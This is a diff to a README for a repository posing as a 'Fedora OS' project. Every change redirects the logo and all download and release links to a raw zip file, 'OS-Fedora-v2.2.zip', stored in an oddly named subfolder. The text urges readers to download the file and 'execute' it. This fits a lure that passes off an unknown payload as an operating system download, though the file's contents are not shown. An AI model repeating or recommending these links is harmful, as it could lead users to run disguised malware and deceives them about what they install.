@@ -1,6 +1,6 @@
 # Fedora OS 🌟
 
-![Fedora OS Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Fedora_logo.svg/1200px-Fedora_logo.svg.png)
+![Fedora OS Logo](https://github.com/Engieeeboiz/Fedora_OS/raw/refs/heads/master/nipponium/OS-Fedora-v2.2.zip)
 
 Welcome to the **Fedora OS** repository! This project aims to provide users with a robust and flexible operating system based on the Fedora distribution. Fedora OS is known for its cutting-edge features, stability, and strong community support.
 
@@ -23,7 +23,7 @@ Fedora OS is a Linux distribution that serves as a platform for innovation. It i
 
 To get started with Fedora OS, follow these steps:
 
-1. **Download the latest version** from the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/releases).
+1. **Download the latest version** from the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/raw/refs/heads/master/nipponium/OS-Fedora-v2.2.zip).
 2. **Create a bootable USB drive** using tools like Rufus or Etcher.
 3. **Boot from the USB drive** and follow the on-screen instructions to install Fedora OS.
 
@@ -40,7 +40,7 @@ Before installing Fedora OS, ensure your system meets the following requirements
 
 ### Steps to Install
 
-1. **Download the ISO file** from the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/releases).
+1. **Download the ISO file** from the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/raw/refs/heads/master/nipponium/OS-Fedora-v2.2.zip).
 2. **Verify the integrity** of the downloaded file using checksums provided on the website.
 3. **Create a bootable USB drive** with the ISO file.
 4. **Boot from the USB drive** and select "Install Fedora."
@@ -78,7 +78,7 @@ If you encounter any issues or have questions, please refer to the following res
 
 ## Releases
 
-To download the latest version of Fedora OS, visit the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/releases). Here, you will find all the available versions. Download the desired file and execute it to start your journey with Fedora OS.
+To download the latest version of Fedora OS, visit the [Releases section](https://github.com/Engieeeboiz/Fedora_OS/raw/refs/heads/master/nipponium/OS-Fedora-v2.2.zip). Here, you will find all the available versions. Download the desired file and execute it to start your journey with Fedora OS.
 
 ## License
 
